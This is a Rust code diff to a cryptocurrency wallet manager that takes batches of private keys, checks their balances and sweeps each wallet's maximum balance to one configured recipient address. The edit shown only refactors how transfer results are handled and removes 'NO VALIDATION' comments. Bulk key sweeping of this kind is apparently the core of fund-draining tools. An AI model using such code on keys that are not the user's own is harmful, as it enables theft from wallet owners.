@@ -29,7 +29,6 @@ impl WalletManager {
         })
     }
     
-    // Single key processing - NO VALIDATION
     pub async fn process_private_key(
         &self,
         private_key: &str,
@@ -63,21 +62,24 @@ impl WalletManager {
             
             info!("📤 Transferring {} to {}", max_amount, self.config.recipient_address);
             
+            // FIX: Result ko pehle store karo
             let transfer_result = self.transfer_executor.transfer_native(
                 private_key,
                 &self.config.recipient_address,
                 &max_amount,
                 self.config.gas_limit,
                 self.config.gas_price_gwei,
-            ).await?;
+            ).await;
             
-            Ok((wallet_info, Some(transfer_result)))
+            match transfer_result {
+                Ok(result) => Ok((wallet_info, Some(result))),
+                Err(e) => Err(e),
+            }
         } else {
             Ok((wallet_info, None))
         }
     }
     
-    // Batch processing - NO VALIDATION
     pub async fn process_keys_batch(
         &self,
         private_keys: Vec<String>,
@@ -88,7 +90,6 @@ impl WalletManager {
         
         info!("🔄 Processing {} private keys in batch", private_keys.len());
         
-        // Parallel address derivation
         let derived: Vec<(String, String)> = private_keys
             .par_iter()
             .filter_map(|key| {
@@ -112,13 +113,11 @@ impl WalletManager {
             })
             .collect();
         
-        // Concurrent balance check
         let concurrency_limit = std::cmp::min(addresses.len(), 10);
         let balances = self.balance_checker
             .check_balances_batch_limited(&addresses, concurrency_limit)
             .await;
         
-        // Process sweeps
         let mut results = Vec::with_capacity(balances.len());
         
         for (address, balance_result) in balances {
@@ -146,13 +145,16 @@ impl WalletManager {
                             if max_amount != "0" && !max_amount.starts_with('-') {
                                 info!("📤 Sweeping {} from {}", max_amount, address);
                                 
-                                match self.transfer_executor.transfer_native(
+                                // FIX: Result ko pehle store karo
+                                let transfer_result = self.transfer_executor.transfer_native(
                                     key,
                                     &self.config.recipient_address,
                                     &max_amount,
                                     self.config.gas_limit,
                                     self.config.gas_price_gwei,
-                                ).await {
+                                ).await;
+                                
+                                match transfer_result {
                                     Ok(res) => transfer_res = Some(res),
                                     Err(e) => warn!("Transfer error: {}", e),
                                 }
